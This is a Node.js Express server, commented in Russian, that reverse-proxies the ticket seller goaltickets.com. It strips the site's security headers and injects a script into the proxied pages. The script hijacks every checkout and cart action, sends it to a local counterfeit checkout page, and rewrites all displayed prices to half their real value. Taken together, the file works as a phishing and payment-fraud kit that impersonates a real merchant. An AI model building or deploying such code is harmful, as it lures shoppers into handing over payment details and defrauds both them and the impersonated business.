const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const cors = require('cors');
const helmet = require('helmet');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false
}));

app.use(cors({
  origin: true,
  credentials: true
}));

// Кэширование статических файлов
app.use(express.static('index_files', {
  maxAge: '1d',
  etag: false
}));

// Логирование только важных запросов
app.use((req, res, next) => {
  if (!req.url.includes('/cdn/') && !req.url.includes('/api/')) {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
  }
  next();
});

// Обработка статических файлов локально
app.get('/index_files/*', (req, res, next) => {
  // Если файл есть локально, отдаем его
  next();
});

// 🎯 ПЕРЕХВАТ CHECKOUT СТРАНИЦ
app.get('/checkout*', (req, res) => {
  console.log('🎯 Checkout intercepted:', req.url);
  res.sendFile(__dirname + '/checkout.html');
});

app.get('/cart', (req, res) => {
  console.log('🎯 Cart page intercepted:', req.url);
  res.sendFile(__dirname + '/checkout.html');
});

// Перехватываем все возможные варианты checkout
app.get('*checkout*', (req, res) => {
  console.log('🎯 Checkout variant intercepted:', req.url);
  res.sendFile(__dirname + '/checkout.html');
});

    // Перехватываем внешние ссылки на checkout
    app.get('/checkouts/*', (req, res) => {
      console.log('🎯 External checkout intercepted:', req.url);
      res.sendFile(__dirname + '/checkout.html');
    });

    // Перехватываем все страницы событий
    app.get('/products/*', (req, res, next) => {
      console.log('🎯 Product page intercepted:', req.url);
      // Проксируем к оригинальному сайту, но с нашими модификациями
      next();
    });

    app.get('/collections/*', (req, res, next) => {
      console.log('🎯 Collection page intercepted:', req.url);
      // Проксируем к оригинальному сайту, но с нашими модификациями
      next();
    });

    app.get('/events/*', (req, res, next) => {
      console.log('🎯 Event page intercepted:', req.url);
      // Проксируем к оригинальному сайту, но с нашими модификациями
      next();
    });

    // Проксируем все AJAX запросы для корзины и цен
    app.get('/cart.js', (req, res, next) => {
      console.log('🛒 Cart.js intercepted:', req.url);
      next();
    });

    app.get('/recommendations/*', (req, res, next) => {
      console.log('🛒 Recommendations intercepted:', req.url);
      next();
    });

    app.get('/cdn/*', (req, res, next) => {
      console.log('📦 CDN request intercepted:', req.url);
      next();
    });

    // Проксируем все скрипты и ресурсы
    app.get('/checkouts/internal/*', (req, res, next) => {
      console.log('🔧 Internal script intercepted:', req.url);
      next();
    });

    app.get('/assets/*', (req, res, next) => {
      console.log('📦 Assets intercepted:', req.url);
      next();
    });

    app.get('/cdn/shop/*', (req, res, next) => {
      console.log('📦 Shop CDN intercepted:', req.url);
      next();
    });

    // Проксируем все внешние ресурсы
    app.get('/cdnwidget/*', (req, res, next) => {
      console.log('📦 CDN Widget intercepted:', req.url);
      next();
    });

    app.get('/cdn/shopifycloud/*', (req, res, next) => {
      console.log('📦 Shopify Cloud intercepted:', req.url);
      next();
    });

    // Проксируем все шрифты
    app.get('/cdn/fonts/*', (req, res, next) => {
      console.log('🔤 Fonts intercepted:', req.url);
      next();
    });

    // Проксируем все скрипты
    app.get('/cdn/shop/t/*', (req, res, next) => {
      console.log('📜 Shop scripts intercepted:', req.url);
      next();
    });

    // Проксируем все AJAX запросы к корзине
    app.post('/cart/add.js', (req, res, next) => {
      console.log('🛒 Cart add.js intercepted:', req.url);
      next();
    });

    app.post('/cart/update.js', (req, res, next) => {
      console.log('🛒 Cart update.js intercepted:', req.url);
      next();
    });

    app.post('/cart/change.js', (req, res, next) => {
      console.log('🛒 Cart change.js intercepted:', req.url);
      next();
    });

    app.post('/cart/clear.js', (req, res, next) => {
      console.log('🛒 Cart clear.js intercepted:', req.url);
      next();
    });

// Обработка POST запросов (возвращаем 200 для избежания ошибок)
app.post('/api/*', (req, res) => {
  res.status(200).json({ success: true });
});

    // Обработка POST запросов к корзине
    app.post('/cart', (req, res) => {
      console.log('🛒 Cart POST intercepted:', req.url);
      // Проксируем к оригинальному сайту для обработки корзины
      const cartProxy = createProxyMiddleware({
        target: 'https://goaltickets.com',
        changeOrigin: true,
        secure: true,
        onProxyRes: (proxyRes, req, res) => {
          // Добавляем CORS заголовки
          proxyRes.headers['Access-Control-Allow-Origin'] = '*';
          proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
          proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin, User-Agent, Cache-Control, Pragma';
          proxyRes.headers['Access-Control-Allow-Credentials'] = 'true';
          
          // Позволяем корзине работать нормально
          if (!res.headersSent) {
            res.writeHead(proxyRes.statusCode, proxyRes.headers);
            proxyRes.pipe(res);
          }
        }
      });
      cartProxy(req, res);
    });

app.post('/cart/*', (req, res) => {
  // Если это запрос на добавление в корзину, обрабатываем как обычно
  if (req.url.includes('add') || req.url.includes('update') || req.url.includes('change') || req.url.includes('clear')) {
    console.log('🛒 Cart action intercepted:', req.url);
    // Проксируем к оригинальному сайту для обработки
    const cartProxy = createProxyMiddleware({
      target: 'https://goaltickets.com',
      changeOrigin: true,
      secure: true,
      onProxyRes: (proxyRes, req, res) => {
        // Добавляем CORS заголовки
        proxyRes.headers['Access-Control-Allow-Origin'] = '*';
        proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
        proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin, User-Agent, Cache-Control, Pragma';
        proxyRes.headers['Access-Control-Allow-Credentials'] = 'true';
        
        // Позволяем корзине работать нормально
        if (!res.headersSent) {
          res.writeHead(proxyRes.statusCode, proxyRes.headers);
          proxyRes.pipe(res);
        }
      }
    });
    cartProxy(req, res);
  } else {
    res.status(200).json({ success: true });
  }
});

// Обработка POST запросов к checkout
app.post('/checkout*', (req, res) => {
  console.log('🎯 Checkout POST intercepted:', req.url);
  // Перенаправляем на checkout страницу вместо JSON
  res.redirect('/checkout');
});

app.post('/.well-known/*', (req, res) => {
  res.status(200).json({ success: true });
});

// Настройка прокси только для HTML страниц
const proxyOptions = {
  target: 'https://goaltickets.com',
  changeOrigin: true,
  secure: true,
  followRedirects: true,
  timeout: 10000, // 10 секунд таймаут
  proxyTimeout: 10000,
  onProxyReq: (proxyReq, req, res) => {
    proxyReq.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    proxyReq.setHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
    proxyReq.setHeader('Accept-Language', 'en-US,en;q=0.5');
    proxyReq.setHeader('Accept-Encoding', 'gzip, deflate, br');
    proxyReq.setHeader('Connection', 'keep-alive');
    proxyReq.setHeader('Cache-Control', 'no-cache');
  },
      onProxyRes: (proxyRes, req, res) => {
        // Удаляем проблемные заголовки
        delete proxyRes.headers['x-frame-options'];
        delete proxyRes.headers['content-security-policy'];
        delete proxyRes.headers['x-content-type-options'];
        delete proxyRes.headers['referrer-policy'];
        
        // Добавляем кэширование
        if (proxyRes.headers['content-type'] && proxyRes.headers['content-type'].includes('text/html')) {
          proxyRes.headers['Cache-Control'] = 'public, max-age=300'; // 5 минут кэш
        }
        
        // Добавляем CORS для всех ресурсов
        proxyRes.headers['Access-Control-Allow-Origin'] = '*';
        proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
        proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin, User-Agent, Cache-Control, Pragma';
        proxyRes.headers['Access-Control-Allow-Credentials'] = 'true';
        proxyRes.headers['Access-Control-Expose-Headers'] = 'Content-Length, Content-Type, Date, Server, Transfer-Encoding';
        
        // Исправляем MIME типы для скриптов
        if (req.url.includes('.js')) {
          proxyRes.headers['Content-Type'] = 'application/javascript; charset=utf-8';
        }
        
        // Исправляем MIME типы для CSS
        if (req.url.includes('.css')) {
          proxyRes.headers['Content-Type'] = 'text/css; charset=utf-8';
        }
        
        // Исправляем MIME типы для шрифтов
        if (req.url.includes('.woff') || req.url.includes('.woff2') || req.url.includes('.ttf') || req.url.includes('.eot')) {
          proxyRes.headers['Content-Type'] = 'font/woff2';
          proxyRes.headers['Access-Control-Allow-Origin'] = '*';
        }
        
        // Перехватываем JSON ответы для изменения цен
        if (proxyRes.headers['content-type'] && proxyRes.headers['content-type'].includes('application/json')) {
          let body = '';
          proxyRes.on('data', (chunk) => {
            body += chunk;
          });
          
          proxyRes.on('end', () => {
            try {
              const jsonData = JSON.parse(body);
              
              // Изменяем цены в JSON
              function modifyPricesInObject(obj) {
                if (typeof obj === 'object' && obj !== null) {
                  for (const key in obj) {
                    if (typeof obj[key] === 'string') {
                      // Ищем цены в строках
                      obj[key] = obj[key].replace(/From\s+\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g, (match, price) => {
                        const cleanPrice = price.replace(/,/g, '');
                        const originalPrice = parseFloat(cleanPrice);
                        
                        if (!isNaN(originalPrice) && originalPrice > 10) {
                          const newPrice = Math.round(originalPrice / 2 * 100) / 100;
                          const formattedPrice = newPrice.toLocaleString('en-US', {
                            minimumFractionDigits: 2,
                            maximumFractionDigits: 2
                          });
                          
                          console.log(`💰 JSON price changed: From $${price} USD -> From $${formattedPrice} USD`);
                          return `From $${formattedPrice} USD`;
                        }
                        return match;
                      });
                      
                      obj[key] = obj[key].replace(/\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g, (match, price) => {
                        const cleanPrice = price.replace(/,/g, '');
                        const originalPrice = parseFloat(cleanPrice);
                        
                        if (!isNaN(originalPrice) && originalPrice > 10) {
                          const newPrice = Math.round(originalPrice / 2 * 100) / 100;
                          const formattedPrice = newPrice.toLocaleString('en-US', {
                            minimumFractionDigits: 2,
                            maximumFractionDigits: 2
                          });
                          
                          console.log(`💰 JSON price changed: $${price} USD -> $${formattedPrice} USD`);
                          return `$${formattedPrice} USD`;
                        }
                        return match;
                      });
                    } else if (typeof obj[key] === 'object') {
                      modifyPricesInObject(obj[key]);
                    }
                  }
                }
              }
              
              modifyPricesInObject(jsonData);
              
              if (!res.headersSent) {
                res.setHeader('Content-Type', 'application/json');
                res.setHeader('Content-Length', Buffer.byteLength(JSON.stringify(jsonData)));
                res.end(JSON.stringify(jsonData));
              }
            } catch (e) {
              console.error('JSON parsing error:', e);
              if (!res.headersSent) {
                res.setHeader('Content-Length', Buffer.byteLength(body));
                res.end(body);
              }
            }
          });
          
          return;
        }
        
        // Инжектируем скрипт перехвата checkout
    if (proxyRes.headers['content-type'] && proxyRes.headers['content-type'].includes('text/html')) {
      let body = '';
      proxyRes.on('data', (chunk) => {
        body += chunk;
      });
      
      proxyRes.on('end', () => {
        // Изменяем цены в HTML - делим на 2
        let modifiedBody = body;
        
            // Агрессивный поиск и замена цен
            console.log('💰 Starting aggressive price modification...');
            
            // Ищем все цены в различных форматах
            const pricePatterns = [
              // From $XXX.XX USD -> From $XXX.XX USD
              { pattern: /From\s+\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g, prefix: 'From $', suffix: ' USD' },
              // $XXX.XX USD -> $XXX.XX USD
              { pattern: /\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g, prefix: '$', suffix: ' USD' },
              // USD $XXX.XX -> USD $XXX.XX
              { pattern: /USD\s+\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)/g, prefix: 'USD $', suffix: '' },
              // USD XXX.XX -> USD XXX.XX
              { pattern: /USD\s+(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)/g, prefix: 'USD ', suffix: '' },
              // XXX.XX USD -> XXX.XX USD
              { pattern: /(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g, prefix: '', suffix: ' USD' },
              // $XXX.XX -> $XXX.XX
              { pattern: /\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)/g, prefix: '$', suffix: '' },
              // Цены в data атрибутах
              { pattern: /data-price="(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)"/g, prefix: 'data-price="', suffix: '"' },
              // Цены в JSON
              { pattern: /"price":\s*(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)/g, prefix: '"price": ', suffix: '' },
              // Цены в span с классом price
              { pattern: /<span[^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s*<\/span>/g, prefix: '', suffix: '' },
              // Цены в div с классом price
              { pattern: /<div[^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s*<\/div>/g, prefix: '', suffix: '' },
              // Цены в p с классом price
              { pattern: /<p[^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s*<\/p>/g, prefix: '', suffix: '' },
              // Цены в strong с классом price
              { pattern: /<strong[^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s*<\/strong>/g, prefix: '', suffix: '' },
              // Цены в h1-h6 с классом price
              { pattern: /<h[1-6][^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s*<\/h[1-6]>/g, prefix: '', suffix: '' },
              // Цены в любом элементе с классом содержащим price
              { pattern: /<[^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s*<\/[^>]*>/g, prefix: '', suffix: '' },
              // Цены в data атрибутах с разными именами
              { pattern: /data-amount="(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)"/g, prefix: 'data-amount="', suffix: '"' },
              { pattern: /data-cost="(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)"/g, prefix: 'data-cost="', suffix: '"' },
              { pattern: /data-value="(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)"/g, prefix: 'data-value="', suffix: '"' },
              // Цены в JSON с разными ключами
              { pattern: /"amount":\s*(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)/g, prefix: '"amount": ', suffix: '' },
              { pattern: /"cost":\s*(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)/g, prefix: '"cost": ', suffix: '' },
              { pattern: /"value":\s*(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)/g, prefix: '"value": ', suffix: '' },
              // Цены в тексте без символа доллара
              { pattern: /(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s*\/ticket/g, prefix: '', suffix: ' /ticket' },
              { pattern: /(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s*per\s+ticket/g, prefix: '', suffix: ' per ticket' },
              // Цены в формате "900.00 /ticket"
              { pattern: /(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)\s*\/ticket/g, prefix: '', suffix: ' /ticket' },
              // Простые цены с долларом
              { pattern: /\$(\d{1,4}(?:,\d{3})*(?:\.\d{2})?)/g, prefix: '$', suffix: '' }
            ];
            
            pricePatterns.forEach(({ pattern, prefix, suffix }) => {
              modifiedBody = modifiedBody.replace(pattern, (match, price) => {
                // Убираем запятые и конвертируем в число
                const cleanPrice = price.replace(/,/g, '');
                const originalPrice = parseFloat(cleanPrice);
                
                if (!isNaN(originalPrice) && originalPrice > 0 && originalPrice > 10) { // Только цены больше 10
                  // Делим на 2 и округляем до 2 знаков
                  const newPrice = Math.round(originalPrice / 2 * 100) / 100;
                  
                  // Форматируем обратно с запятыми
                  const formattedPrice = newPrice.toLocaleString('en-US', {
                    minimumFractionDigits: 2,
                    maximumFractionDigits: 2
                  });
                  
                  console.log(`💰 Price changed: ${prefix}${price}${suffix} -> ${prefix}${formattedPrice}${suffix}`);
                  return match.replace(price, formattedPrice);
                }
                return match;
              });
            });
        
        // Добавляем скрипт перехвата перед закрывающим тегом </body>
        const checkoutScript = `
          <script>
            // 🎯 CHECKOUT INTERCEPTOR
            (function() {
              console.log('🎯 Checkout Interceptor loaded');
              
              function interceptCheckoutClicks() {
                document.addEventListener('click', function(event) {
                  const target = event.target;
                  const text = target.textContent?.toLowerCase() || '';
                  const href = target.href || '';
                  const form = target.closest('form');
                  
                  // Перехватываем все checkout кнопки и ссылки
                  if (text.includes('checkout') || text.includes('купить') || 
                      text.includes('оформить') || href.includes('checkout') ||
                      target.classList.contains('checkout') || target.id.includes('checkout') ||
                      (form && form.action && form.action.includes('cart')) ||
                      // Перехватываем внешние ссылки на goaltickets.com/checkout
                      href.includes('goaltickets.com/checkout') ||
                      href.includes('goaltickets.com/cart') ||
                      // Перехватываем любые ссылки содержащие checkout
                      (href && (href.includes('/checkout') || href.includes('/cart')))) {
                    
                    console.log('🎯 Checkout button clicked:', target, 'href:', href);
                    event.preventDefault();
                    event.stopPropagation();
                    
                    // Показываем уведомление
                    const notification = document.createElement('div');
                    notification.innerHTML = \`
                      <div style="position:fixed;top:20px;right:20px;background:linear-gradient(45deg,#ff6b6b,#ee5a24);color:white;padding:15px 25px;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,0.3);z-index:10000;font-family:Arial,sans-serif;font-weight:bold;">
                        Перенаправляем на checkout...
                      </div>
                    \`;
                    document.body.appendChild(notification);
                    
                    setTimeout(() => {
                      window.location.href = '/checkout';
                    }, 500);
                    
                    return false;
                  }
                });
              }
              
              // Перехватываем формы
              function interceptForms() {
                document.addEventListener('submit', function(event) {
                  const form = event.target;
                  const action = form.action?.toLowerCase() || '';
                  
                  if (action.includes('checkout')) {
                    console.log('🎯 Checkout form submission intercepted:', form);
                    event.preventDefault();
                    event.stopPropagation();
                    
                    const notification = document.createElement('div');
                    notification.innerHTML = \`
                      <div style="position:fixed;top:20px;right:20px;background:linear-gradient(45deg,#ff6b6b,#ee5a24);color:white;padding:15px 25px;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,0.3);z-index:10000;font-family:Arial,sans-serif;font-weight:bold;">
                        Обрабатываем заказ...
                      </div>
                    \`;
                    document.body.appendChild(notification);
                    
                    setTimeout(() => {
                      window.location.href = '/checkout';
                    }, 1000);
                    
                    return false;
                  }
                  // Для cart форм - не перехватываем, позволяем работать нормально
                });
              }
              
              if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', function() {
                  interceptCheckoutClicks();
                  interceptForms();
                });
              } else {
                interceptCheckoutClicks();
                interceptForms();
              }
              
              // Дополнительная проверка
              setTimeout(() => {
                interceptCheckoutClicks();
                interceptForms();
              }, 2000);
              
              // Перехватываем все ссылки на checkout при загрузке страницы
              function interceptAllCheckoutLinks() {
                const links = document.querySelectorAll('a[href*="checkout"], a[href*="cart"], button[onclick*="checkout"], button[onclick*="cart"]');
                links.forEach(link => {
                  if (link.href && (link.href.includes('checkout') || link.href.includes('cart'))) {
                    console.log('🎯 Found checkout link:', link);
                    link.addEventListener('click', function(e) {
                      e.preventDefault();
                      e.stopPropagation();
                      console.log('🎯 Checkout link clicked:', link.href);
                      window.location.href = '/checkout';
                      return false;
                    });
                  }
                });
              }
              
              // Запускаем перехват ссылок
              setTimeout(interceptAllCheckoutLinks, 1000);
              setTimeout(interceptAllCheckoutLinks, 3000);
              
              // 🎯 ПЕРЕХВАТ ВСЕХ ССЫЛОК НА СОБЫТИЯ
              function interceptEventLinks() {
                console.log('🔗 Intercepting event links...');
                
                // Перехватываем все ссылки на события
                document.addEventListener('click', function(event) {
                  const target = event.target;
                  const href = target.href || target.closest('a')?.href;
                  
                  if (href) {
                    // Если ссылка ведет на goaltickets.com
                    if (href.includes('goaltickets.com')) {
                      console.log('🔗 Event link intercepted:', href);
                      event.preventDefault();
                      event.stopPropagation();
                      
                      // Извлекаем путь после домена
                      const url = new URL(href);
                      const path = url.pathname + url.search + url.hash;
                      
                      // Перенаправляем на наш прокси
                      window.location.href = path;
                      return false;
                    }
                    
                    // Если ссылка ведет на события (products, collections)
                    if (href.includes('/products/') || href.includes('/collections/') || 
                        href.includes('/events/') || href.includes('/tickets/')) {
                      console.log('🔗 Event page link intercepted:', href);
                      event.preventDefault();
                      event.stopPropagation();
                      
                      // Перенаправляем на наш прокси
                      window.location.href = href;
                      return false;
                    }
                  }
                });
                
                // Также перехватываем все ссылки при загрузке страницы
                const allLinks = document.querySelectorAll('a[href]');
                allLinks.forEach(link => {
                  const href = link.href;
                  
                  if (href.includes('goaltickets.com')) {
                    // Извлекаем путь после домена
                    const url = new URL(href);
                    const path = url.pathname + url.search + url.hash;
                    
                    // Обновляем href на наш прокси
                    link.href = path;
                    console.log('🔗 Link updated:', href, '->', path);
                  }
                });
              }
              
                  // 🎯 ИСПРАВЛЕНИЕ SERVICE WORKER
                  function fixServiceWorker() {
                    // Отключаем Service Worker
                    if ('serviceWorker' in navigator) {
                      navigator.serviceWorker.getRegistrations().then(function(registrations) {
                        for(let registration of registrations) {
                          registration.unregister();
                        }
                      });
                    }
                  }
                  
                  // 🎯 ИЗМЕНЕНИЕ ЦЕН НА СТРАНИЦЕ
                  function modifyPricesOnPage() {
                    console.log('💰 Modifying prices on page...');
                
                // Ищем все элементы с ценами
                const priceSelectors = [
                  '[class*="price"]',
                  '[class*="cost"]',
                  '[class*="amount"]',
                  '[data-price]',
                  'span:contains("$")',
                  'div:contains("USD")',
                  'p:contains("$")',
                  'h1:contains("$")',
                  'h2:contains("$")',
                  'h3:contains("$")',
                  'h4:contains("$")',
                  'h5:contains("$")',
                  'h6:contains("$")',
                  'strong:contains("$")',
                  'b:contains("$")',
                  'em:contains("$")',
                  'i:contains("$")'
                ];
                
                priceSelectors.forEach(selector => {
                  try {
                    const elements = document.querySelectorAll(selector);
                    elements.forEach(element => {
                      const text = element.textContent || element.innerText || '';
                      
                      // Ищем цены в различных форматах
                      const pricePatterns = [
                        /From\s+\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g,
                        /\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g,
                        /USD\s+\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
                        /USD\s+(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
                        /(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g,
                        /\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g
                      ];
                      
                      pricePatterns.forEach(pattern => {
                        const matches = text.match(pattern);
                        if (matches) {
                          matches.forEach(match => {
                            const priceMatch = match.match(/(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/);
                            if (priceMatch) {
                              const originalPrice = priceMatch[1];
                              const cleanPrice = originalPrice.replace(/,/g, '');
                              const priceValue = parseFloat(cleanPrice);
                              
                              if (!isNaN(priceValue) && priceValue > 0) {
                                const newPrice = Math.round(priceValue / 2 * 100) / 100;
                                const formattedPrice = newPrice.toLocaleString('en-US', {
                                  minimumFractionDigits: 2,
                                  maximumFractionDigits: 2
                                });
                                
                                const newText = text.replace(match, match.replace(originalPrice, formattedPrice));
                                element.textContent = newText;
                                console.log('💰 Client price changed:', match, '->', match.replace(originalPrice, formattedPrice));
                              }
                            }
                          });
                        }
                      });
                    });
                  } catch (e) {
                    // Игнорируем ошибки селекторов
                  }
                });
                
                // Также изменяем цены в data атрибутах
                const elementsWithDataPrice = document.querySelectorAll('[data-price]');
                elementsWithDataPrice.forEach(element => {
                  const price = element.getAttribute('data-price');
                  const priceValue = parseFloat(price);
                  
                  if (!isNaN(priceValue) && priceValue > 0) {
                    const newPrice = Math.round(priceValue / 2 * 100) / 100;
                    element.setAttribute('data-price', newPrice.toString());
                    console.log('💰 Data price changed:', price, '->', newPrice);
                  }
                });
              }
              
                  // Запускаем перехват ссылок
                  setTimeout(interceptEventLinks, 100);
                  setTimeout(interceptEventLinks, 1000);
                  setTimeout(interceptEventLinks, 3000);
                  
                  // Запускаем изменение цен
                  setTimeout(modifyPricesOnPage, 500);
                  setTimeout(modifyPricesOnPage, 2000);
                  setTimeout(modifyPricesOnPage, 5000);
                  
                  // Исправляем Service Worker
                  setTimeout(fixServiceWorker, 1000);
              
              // Агрессивный поиск и изменение цен по всему документу
              function aggressivePriceModification() {
                console.log('💰 Aggressive price modification...');
                
                // Ищем все текстовые узлы
                const walker = document.createTreeWalker(
                  document.body,
                  NodeFilter.SHOW_TEXT,
                  null,
                  false
                );
                
                const textNodes = [];
                let node;
                while (node = walker.nextNode()) {
                  textNodes.push(node);
                }
                
                textNodes.forEach(textNode => {
                  const text = textNode.textContent;
                  if (text && text.includes('$')) {
                    // Ищем цены в тексте
                    const pricePatterns = [
                      /From\s+\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g,
                      /\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g,
                      /USD\s+\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
                      /USD\s+(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
                      /(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g,
                      /\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g
                    ];
                    
                    let modifiedText = text;
                    pricePatterns.forEach(pattern => {
                      modifiedText = modifiedText.replace(pattern, (match, price) => {
                        const cleanPrice = price.replace(/,/g, '');
                        const priceValue = parseFloat(cleanPrice);
                        
                        if (!isNaN(priceValue) && priceValue > 0) {
                          const newPrice = Math.round(priceValue / 2 * 100) / 100;
                          const formattedPrice = newPrice.toLocaleString('en-US', {
                            minimumFractionDigits: 2,
                            maximumFractionDigits: 2
                          });
                          
                          console.log('💰 Aggressive price changed:', match, '->', match.replace(price, formattedPrice));
                          return match.replace(price, formattedPrice);
                        }
                        return match;
                      });
                    });
                    
                    if (modifiedText !== text) {
                      textNode.textContent = modifiedText;
                    }
                  }
                });
              }
              
              // Запускаем агрессивное изменение цен
              setTimeout(aggressivePriceModification, 1000);
              setTimeout(aggressivePriceModification, 3000);
              setTimeout(aggressivePriceModification, 6000);
            })();
          </script>
        `;
        
        // Вставляем скрипт перед </body>
        modifiedBody = modifiedBody.replace('</body>', checkoutScript + '</body>');
        
        if (!res.headersSent) {
          res.setHeader('Content-Length', Buffer.byteLength(modifiedBody));
          res.end(modifiedBody);
        }
      });
      
      return;
    }
  },
  onError: (err, req, res) => {
    console.error('Proxy Error:', err.message);
    if (!res.headersSent) {
      res.status(500).send('Service temporarily unavailable');
    }
  }
};

// Применяем прокси только к корневой странице
app.get('/', createProxyMiddleware(proxyOptions));

    // Для всех остальных GET запросов - прокси к оригинальному сайту
    app.get('*', createProxyMiddleware({
      target: 'https://goaltickets.com',
      changeOrigin: true,
      secure: true,
      timeout: 5000,
      onProxyRes: (proxyRes, req, res) => {
        // Добавляем CORS для всех ресурсов
        proxyRes.headers['Access-Control-Allow-Origin'] = '*';
        proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
        proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin, User-Agent, Cache-Control, Pragma';
        proxyRes.headers['Access-Control-Allow-Credentials'] = 'true';
        
        // Исправляем MIME типы
        if (req.url.includes('.js')) {
          proxyRes.headers['Content-Type'] = 'application/javascript; charset=utf-8';
        }
        if (req.url.includes('.css')) {
          proxyRes.headers['Content-Type'] = 'text/css; charset=utf-8';
        }
        if (req.url.includes('.woff') || req.url.includes('.woff2') || req.url.includes('.ttf') || req.url.includes('.eot')) {
          proxyRes.headers['Content-Type'] = 'font/woff2';
        }
      },
      onError: (err, req, res) => {
        if (!res.headersSent) {
          res.status(404).send('Not found');
        }
      }
    }));

// Обработка ошибок
app.use((err, req, res, next) => {
  console.error('Server Error:', err);
  res.status(500).json({ error: 'Internal Server Error' });
});

// Запуск сервера
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Proxy server running on port ${PORT}`);
  console.log(`📡 Proxying requests to: https://goaltickets.com`);
  console.log(`🌐 Access your proxy at: http://localhost:${PORT}`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down gracefully');
  process.exit(0);
});

process.on('SIGINT', () => {
  console.log('SIGINT received, shutting down gracefully');
  process.exit(0);
});
